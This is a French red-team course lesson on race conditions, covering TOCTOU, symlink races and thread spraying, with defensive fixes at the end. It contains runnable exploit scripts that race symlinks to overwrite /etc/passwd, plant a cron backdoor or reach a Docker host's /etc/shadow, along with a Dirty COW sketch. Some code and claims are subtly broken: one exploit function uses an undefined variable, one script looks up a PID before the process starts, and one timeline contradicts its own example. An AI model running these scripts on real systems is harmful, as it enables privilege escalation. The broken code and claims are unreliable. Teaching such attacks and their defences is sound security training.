# 27 - Race Conditions

## 🎯 Ce que tu vas apprendre

- C'est quoi une race condition et pourquoi c'est dangereux
- Les vulnérabilités TOCTOU (Time-Of-Check Time-Of-Use)
- Comment exploiter les programmes multi-threadés
- Les attaques de type symlink race
- Techniques d'exploitation pour l'escalade de privilèges
- Comment détecter et exploiter les fenêtres temporelles

## 📚 Théorie

### Concept 1 : C'est quoi une Race Condition ?

**C'est quoi ?**
Une race condition survient quand deux threads (ou processus) accèdent simultanément à une ressource partagée, et le résultat dépend de l'ordre d'exécution (timing). C'est une "course" : qui arrive en premier ?

**Pourquoi c'est dangereux ?**
Le comportement devient non-déterministe : parfois ça marche, parfois non. Un attaquant peut exploiter cette fenêtre temporelle pour :
- Corrompre des données
- Contourner des vérifications de sécurité
- Escalader ses privilèges

**Exemple simple** :

```c
// Variable partagée entre 2 threads
int balance = 1000;

// Thread 1 : Retrait
void withdraw(int amount) {
    if (balance >= amount) {      // ← ÉTAPE 1 : Check
        balance -= amount;         // ← ÉTAPE 2 : Use
        printf("Retrait OK\n");
    }
}

// Thread 2 : Même code
```

**Ce qui se passe (race condition)** :

```
ÉTAT : balance = 1000

T=0ms : Thread1 → Check (1000 >= 900) → OK
T=1ms : Thread2 → Check (1000 >= 900) → OK
T=2ms : Thread1 → balance -= 900 → balance = 100
T=3ms : Thread2 → balance -= 900 → balance = -800 ❌

Résultat : Découvert autorisé ! Les deux retraits passent.
```

**Visualisation** :

```
Thread 1          Thread 2         balance
   |                 |               1000
   |-- check -->     |
   |  (OK)           |               1000
   |                 |-- check -->
   |                 |  (OK)         1000
   |-- withdraw -->  |
   |                 |               100
   |                 |-- withdraw -->
   |                 |               -800 ❌
```

### Concept 2 : TOCTOU (Time-Of-Check Time-Of-Use)

**C'est quoi ?**
TOCTOU est un type spécifique de race condition :
1. **Time Of Check** : Le programme vérifie une condition (ex: permissions, existence fichier)
2. **Fenêtre temporelle** : Délai entre check et use
3. **Time Of Use** : Le programme utilise la ressource

Un attaquant modifie la ressource ENTRE le check et le use.

**Pourquoi c'est dangereux ?**
Le check devient obsolète. Le programme pense que tout est OK, mais la réalité a changé.

**Exemple classique : Vérification de fichier**

```c
// Programme SETUID root (s'exécute avec droits root)
int main(int argc, char *argv[]) {
    char *filename = argv[1];

    // ÉTAPE 1 : CHECK (avec privilèges utilisateur)
    if (access(filename, W_OK) != 0) {
        printf("Accès refusé\n");
        return 1;
    }

    // ⏱️ FENÊTRE TEMPORELLE ⏱️
    // Attaquant change filename vers /etc/passwd ici !

    // ÉTAPE 2 : USE (avec privilèges root)
    FILE *f = fopen(filename, "w");  // Ouvre avec droits root
    fprintf(f, "hacker:x:0:0::/root:/bin/sh\n");  // ❌ Écrit dans /etc/passwd
    fclose(f);

    return 0;
}
```

**Visualisation de l'attaque** :

```
AVANT (t=0) :
/tmp/userfile → fichier normal (user peut écrire)
/etc/passwd   → fichier système (user ne peut PAS écrire)

Programme vulnérable exécute :
t=0ms : access("/tmp/userfile", W_OK) → OK ✓
t=1ms : [FENÊTRE] Attaquant fait : rm /tmp/userfile; ln -s /etc/passwd /tmp/userfile
t=2ms : fopen("/tmp/userfile", "w") → Ouvre /etc/passwd avec droits root ❌

APRÈS :
/etc/passwd contient maintenant la ligne de l'attaquant
→ Compte root créé !
```

**Schéma du flux** :

```
Programme SETUID                    Attaquant
     |
     |-- access(filename) -->
     |   [Check permissions]
     |   ✓ OK
     |
     |   ⏱️ FENÊTRE ⏱️                |
     |                               |-- rm filename
     |                               |-- ln -s /etc/passwd filename
     |
     |-- fopen(filename, "w") -->
     |   [Use with ROOT perms]
     |   ❌ Écrit /etc/passwd
     ↓
Exploitation réussie
```

### Concept 3 : Types de Race Conditions

**1. Data Race (Course sur les données)**

**C'est quoi ?**
Plusieurs threads accèdent simultanément à la même variable, au moins un en écriture, sans synchronisation.

```c
int counter = 0;  // Partagé

void increment() {
    counter++;  // ❌ NON ATOMIQUE
    // Assembly :
    // 1. Lire counter dans registre
    // 2. Incrémenter registre
    // 3. Écrire registre dans counter
}

// 2 threads exécutent increment() simultanément
// Résultat attendu : counter = 2
// Résultat réel : counter = 1 ou 2 (race!)
```

**Visualisation** :

```
Thread 1              Thread 2              counter (mémoire)
   |                     |                       0
   |-- read (0) -->      |                       0
   |                     |-- read (0) -->        0
   |-- add 1 -->         |                       0
   |                     |-- add 1 -->           0
   |-- write (1) -->     |                       1
   |                     |-- write (1) -->       1 ❌

Résultat : counter = 1 au lieu de 2
```

**2. File System Race**

**C'est quoi ?**
Exploitation de la fenêtre entre une opération filesystem et une autre.

```c
// Vulnérable
char tmpfile[256];
sprintf(tmpfile, "/tmp/app_%d", getpid());

// Check si le fichier existe
if (access(tmpfile, F_OK) != 0) {
    // ⏱️ FENÊTRE : Attaquant crée tmpfile comme symlink
    FILE *f = fopen(tmpfile, "w");  // Suit le symlink
    fprintf(f, "sensitive data");
}
```

**Attaque symlink** :

```bash
# Script attaquant en parallèle
while true; do
    ln -sf /etc/passwd /tmp/app_1234
    rm /tmp/app_1234
done

# Résultat : Le programme écrit dans /etc/passwd
```

**3. Signal Race**

**C'est quoi ?**
Exploitation de la non-réentrance des handlers de signaux.

```c
char *buffer = NULL;

void signal_handler(int sig) {
    free(buffer);  // ❌ Race si appelé 2 fois
    buffer = NULL;
}

int main() {
    signal(SIGINT, signal_handler);
    buffer = malloc(100);

    // Si 2 SIGINT arrivent rapidement :
    // → Double free !
}
```

### Concept 4 : Techniques d'exploitation

**1. Symlink Attack (Attaque par lien symbolique)**

**C'est quoi ?**
Créer un lien symbolique vers un fichier privilégié pendant la fenêtre TOCTOU.

**Exemple d'exploitation** :

```c
// Programme vulnérable (SETUID root)
void create_log() {
    char logfile[256];
    sprintf(logfile, "/tmp/app_%d.log", getuid());

    // Check
    if (access(logfile, F_OK) != 0) {
        // ⏱️ FENÊTRE
        FILE *f = fopen(logfile, "w");  // Use avec droits root
        fprintf(f, "Log entry\n");
        fclose(f);
    }
}
```

**Script d'attaque** :

```bash
#!/bin/bash
# Exploit symlink race

TARGET="/tmp/app_$UID.log"
VICTIM="/etc/cron.d/backdoor"

# Boucle d'exploitation
while true; do
    # Créer symlink vers fichier privilégié
    ln -sf "$VICTIM" "$TARGET" 2>/dev/null

    # Lancer le programme vulnérable
    /usr/local/bin/vulnerable_app &

    # Supprimer le symlink
    rm -f "$TARGET" 2>/dev/null
done

# Si l'attaque réussit : /etc/cron.d/backdoor créé avec notre contenu
```

**2. Thread Spraying**

**C'est quoi ?**
Lancer de nombreux threads pour augmenter les chances de gagner la race.

```c
#include <pthread.h>
#include <stdio.h>

int balance = 1000;
int success_count = 0;

void* attack_thread(void *arg) {
    // Essayer de retirer pendant la fenêtre
    if (balance >= 900) {
        balance -= 900;
        success_count++;
    }
    return NULL;
}

int main() {
    pthread_t threads[1000];

    // Lancer 1000 threads simultanément
    for (int i = 0; i < 1000; i++) {
        pthread_create(&threads[i], NULL, attack_thread, NULL);
    }

    // Attendre tous les threads
    for (int i = 0; i < 1000; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("Balance finale : %d\n", balance);
    printf("Retraits réussis : %d\n", success_count);
    // Attendu : 1 retrait, balance = 100
    // Réel : Plusieurs retraits, balance < 0

    return 0;
}
```

**3. Timing Attack (Affinage de la fenêtre)**

**C'est quoi ?**
Mesurer précisément la fenêtre TOCTOU et attaquer au bon moment.

```c
#include <time.h>

void measure_window() {
    struct timespec start, end;

    clock_gettime(CLOCK_MONOTONIC, &start);

    // Simuler check
    access("/tmp/test", R_OK);

    clock_gettime(CLOCK_MONOTONIC, &end);

    // Calculer fenêtre
    long ns = (end.tv_sec - start.tv_sec) * 1000000000L +
              (end.tv_nsec - start.tv_nsec);

    printf("Fenêtre : %ld nanosecondes\n", ns);
}

// Attaque : Agir dans cette fenêtre précise
void exploit() {
    // Attendre le bon timing
    usleep(ns / 2);  // Milieu de la fenêtre
    system("ln -sf /etc/passwd /tmp/target");
}
```

## 🔍 Visualisation : Anatomie d'une Race Condition

```
PROGRAMME MULTI-THREADÉ

┌─────────────────────────────────────────────────────────┐
│                    MÉMOIRE PARTAGÉE                      │
│                     balance = 1000                       │
└─────────────────────────────────────────────────────────┘
         ↑                                      ↑
         │                                      │
    ┌────┴────┐                            ┌────┴────┐
    │ Thread1 │                            │ Thread2 │
    └─────────┘                            └─────────┘

TIMELINE (sans protection) :

t=0    Thread1: Lire balance (1000)
t=1    Thread2: Lire balance (1000)
t=2    Thread1: Vérifier (1000 >= 900) ✓
t=3    Thread2: Vérifier (1000 >= 900) ✓
t=4    Thread1: Calculer (1000 - 900 = 100)
t=5    Thread2: Calculer (1000 - 900 = 100)
t=6    Thread1: Écrire balance = 100
t=7    Thread2: Écrire balance = 100 ❌ (écrase Thread1)

RÉSULTAT : balance = 100
ATTENDU : balance = -800 (2 retraits) OU 1 retrait refusé

═══════════════════════════════════════════════════════════

TOCTOU SUR FILESYSTEM

Programme SETUID                 Attaquant
     │                               │
t=0  │── stat("/tmp/file") ──>      │
     │   Metadata: owner=user       │
     │   ✓ Vérification OK          │
     │                               │
t=1  │      ⏱️ FENÊTRE ⏱️             │
     │                               │── rm /tmp/file
     │                               │── ln -s /etc/shadow /tmp/file
     │                               │
t=2  │── open("/tmp/file", W) ──>   │
     │   Suit le symlink            │
     │   Ouvre /etc/shadow (root!)  │
     │                               │
t=3  │── write("pwned") ────>       │
     │   ❌ Écrit /etc/shadow        │
     └───────────────────────────────┘

EXPLOITATION RÉUSSIE : Fichier système corrompu
```

## 💻 Exemple pratique

### Exploitation TOCTOU classique

```c
// vulnerable_setuid.c
// Compiler : gcc -o vuln vulnerable_setuid.c
// Setup : sudo chown root:root vuln && sudo chmod u+s vuln

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Usage: %s <filename>\n", argv[0]);
        return 1;
    }

    char *filename = argv[1];

    // ÉTAPE 1 : CHECK avec droits utilisateur
    printf("[*] Vérification des permissions...\n");
    if (access(filename, W_OK) != 0) {
        printf("[-] Accès refusé à %s\n", filename);
        return 1;
    }

    printf("[+] Vérification OK\n");

    // ⏱️ FENÊTRE TOCTOU (artificielle pour démo)
    printf("[*] Traitement...\n");
    sleep(1);  // Fenêtre d'1 seconde

    // ÉTAPE 2 : USE avec droits root (SETUID)
    printf("[*] Ouverture du fichier...\n");
    FILE *f = fopen(filename, "a");
    if (f == NULL) {
        perror("fopen");
        return 1;
    }

    fprintf(f, "=== LOG ENTRY ===\n");
    fprintf(f, "User: %d\n", getuid());
    fprintf(f, "Action: File accessed\n");
    fclose(f);

    printf("[+] Log écrit dans %s\n", filename);
    return 0;
}
```

**Script d'exploitation** :

```bash
#!/bin/bash
# exploit_toctou.sh

VICTIM="/etc/passwd"
DECOY="/tmp/myfile_$$"

# Créer fichier leurre
echo "normal content" > "$DECOY"
chmod 666 "$DECOY"

# Boucle d'attaque
while true; do
    # Lancer le programme vulnérable en background
    ./vuln "$DECOY" &
    PID=$!

    # Attendre que le check soit passé
    sleep 0.1

    # Remplacer par symlink pendant la fenêtre
    rm -f "$DECOY"
    ln -sf "$VICTIM" "$DECOY"

    # Attendre la fin
    wait $PID

    # Vérifier si exploitation réussie
    if grep "LOG ENTRY" "$VICTIM" 2>/dev/null; then
        echo "[+] EXPLOITATION RÉUSSIE !"
        echo "[+] /etc/passwd corrompu"
        break
    fi

    # Restaurer pour prochain essai
    rm -f "$DECOY"
    echo "normal content" > "$DECOY"
done
```

### Race condition sur variable partagée

```c
// race_threads.c
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>

#define NUM_THREADS 10
#define NUM_INCREMENTS 100000

int counter = 0;  // Variable partagée SANS protection

void* increment_thread(void *arg) {
    for (int i = 0; i < NUM_INCREMENTS; i++) {
        counter++;  // ❌ NON ATOMIQUE
    }
    return NULL;
}

int main() {
    pthread_t threads[NUM_THREADS];

    printf("[*] Lancement de %d threads...\n", NUM_THREADS);
    printf("[*] Chaque thread incrémente %d fois\n", NUM_INCREMENTS);
    printf("[*] Valeur attendue : %d\n", NUM_THREADS * NUM_INCREMENTS);

    // Créer les threads
    for (int i = 0; i < NUM_THREADS; i++) {
        pthread_create(&threads[i], NULL, increment_thread, NULL);
    }

    // Attendre tous les threads
    for (int i = 0; i < NUM_THREADS; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("[*] Valeur finale : %d\n", counter);

    if (counter == NUM_THREADS * NUM_INCREMENTS) {
        printf("[+] Pas de race condition détectée\n");
    } else {
        printf("[-] RACE CONDITION ! Perdu %d incréments\n",
               NUM_THREADS * NUM_INCREMENTS - counter);
    }

    return 0;
}
```

**Compilation et test** :

```bash
gcc -pthread -o race race_threads.c
./race

# Résultats typiques :
# [*] Lancement de 10 threads...
# [*] Chaque thread incrémente 100000 fois
# [*] Valeur attendue : 1000000
# [*] Valeur finale : 847293
# [-] RACE CONDITION ! Perdu 152707 incréments
```

### Exploitation réelle : Privilege escalation via /tmp race

```c
// temp_race.c - Programme vulnérable SETUID
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>

void create_temp_file() {
    char tmpfile[256];
    snprintf(tmpfile, sizeof(tmpfile), "/tmp/app_%d", getpid());

    // CHECK : Vérifier si le fichier existe
    struct stat st;
    if (stat(tmpfile, &st) == 0) {
        printf("[-] Fichier temporaire existe déjà\n");
        return;
    }

    // ⏱️ FENÊTRE TOCTOU ⏱️

    // USE : Créer le fichier avec droits root
    FILE *f = fopen(tmpfile, "w");
    if (f) {
        fprintf(f, "root:x:0:0:root:/root:/bin/bash\n");
        fclose(f);
        printf("[+] Fichier créé : %s\n", tmpfile);
    }
}

int main() {
    create_temp_file();
    return 0;
}
```

**Exploit** :

```bash
#!/bin/bash
# Exploitation de la race condition

TARGET_PID=$(pgrep temp_race)

# Boucle d'attaque
while true; do
    TMPFILE="/tmp/app_${TARGET_PID}"

    # Créer symlink vers /etc/passwd
    ln -sf /etc/passwd "$TMPFILE" 2>/dev/null

    # Lancer le programme vulnérable
    ./temp_race

    # Vérifier si exploitation réussie
    if grep "root:x:0:0" /etc/passwd | grep -q "/bin/bash"; then
        echo "[+] Exploitation réussie !"
        break
    fi

    rm -f "$TMPFILE"
    sleep 0.01
done
```

## 🎯 Application Red Team

### 1. Exploitation de programmes SETUID

**Cibles typiques** :
- Programmes système avec droits root
- Utilitaires de log (/var/log écriture)
- Scripts temporaires dans /tmp

**Technique** :

```bash
# 1. Identifier les binaires SETUID
find / -perm -4000 -type f 2>/dev/null

# 2. Analyser avec strace pour trouver TOCTOU
strace -f -e trace=file ./setuid_program 2>&1 | grep -E "access|open|stat"

# Exemple de pattern vulnérable :
# access("/tmp/file", W_OK) = 0
# [délai]
# open("/tmp/file", O_WRONLY) = 3

# 3. Exploiter avec symlink race
```

### 2. Container escape via race condition

**Scénario** : Docker avec volume /tmp partagé

```bash
# Dans le container
while true; do
    ln -sf /host/etc/shadow /tmp/app_log
    rm /tmp/app_log
done &

# Le processus host écrit dans /tmp/app_log
# → Écrit dans /etc/shadow de l'host
# → Container escape
```

### 3. Kernel race conditions (Dirty COW style)

**Concept** : Exploiter les races dans le kernel

```c
// Simplified Dirty COW concept
void* madvise_thread(void *arg) {
    while(1) {
        madvise(map, 100, MADV_DONTNEED);  // Invalider mapping
    }
}

void* write_thread(void *arg) {
    while(1) {
        write(f, "data", 4);  // Écrire dans readonly file
        // Race avec madvise → COW page modifiée
    }
}
```

### 4. Race dans l'authentification

**Vulnérabilité** : Vérification de credentials avec race

```c
// Code vulnérable
int authenticate(char *username, char *password) {
    // CHECK : Lire credentials
    User *user = get_user(username);

    // ⏱️ FENÊTRE : Attaquant modifie user en DB

    // USE : Vérifier password
    if (strcmp(user->password, password) == 0) {
        return 1;  // Authentifié
    }
    return 0;
}

// Attaque : Changer le password entre get_user et strcmp
```

### 5. Détection et prévention

**Outils de détection** :

```bash
# 1. ThreadSanitizer (TSan) - Détecte data races
gcc -fsanitize=thread -g program.c -o program
./program

# 2. Helgrind (Valgrind) - Détecte races et deadlocks
valgrind --tool=helgrind ./program

# 3. Recherche de patterns TOCTOU
grep -r "access.*open\|stat.*fopen" source_code/
```

**Protections** :

```c
// 1. Utiliser des fonctions atomiques
#include <stdatomic.h>
atomic_int counter = 0;
atomic_fetch_add(&counter, 1);  // ✓ ATOMIQUE

// 2. Utiliser des mutex
pthread_mutex_t lock = PTHREAD_MUTEX_INITIALIZER;
pthread_mutex_lock(&lock);
counter++;  // Zone critique protégée
pthread_mutex_unlock(&lock);

// 3. Ouvrir avec O_CREAT|O_EXCL pour éviter TOCTOU
int fd = open(filename, O_WRONLY|O_CREAT|O_EXCL, 0600);
// Échoue si le fichier existe déjà (atomique)

// 4. Utiliser fstatat/openat (file descriptor relatif)
int dirfd = open("/tmp", O_RDONLY|O_DIRECTORY);
fstatat(dirfd, "file", &st, AT_SYMLINK_NOFOLLOW);
openat(dirfd, "file", O_WRONLY);  // Pas de race
```

## 📝 Points clés à retenir

- Race condition : Résultat dépend du timing d'exécution (non-déterministe)
- TOCTOU : Fenêtre entre vérification (check) et utilisation (use)
- Symlink attack : Créer un lien symbolique pendant la fenêtre TOCTOU
- Thread spraying : Lancer nombreux threads pour augmenter chances de succès
- Exploitation typique : Programmes SETUID, fichiers temporaires, multi-threading
- Protection : Mutex, opérations atomiques, open avec O_EXCL, openat()
- Détection : ThreadSanitizer, Helgrind, analyse de code
- En Red Team : Privilege escalation, container escape, corruption de fichiers système
- Toujours utiliser des primitives de synchronisation (mutex, semaphores)
- Éviter access() + open() → Utiliser directement open() avec bonnes flags

## ➡️ Prochaine étape

Maintenant que tu comprends les race conditions, tu vas apprendre à créer des [Reverse Shells](../28_reverse_shell/) pour prendre le contrôle à distance d'un système compromis.

---

**Exercices** : Voir [exercice.txt](exercice.txt)
**Code exemple** : Voir [example.c](example.c)
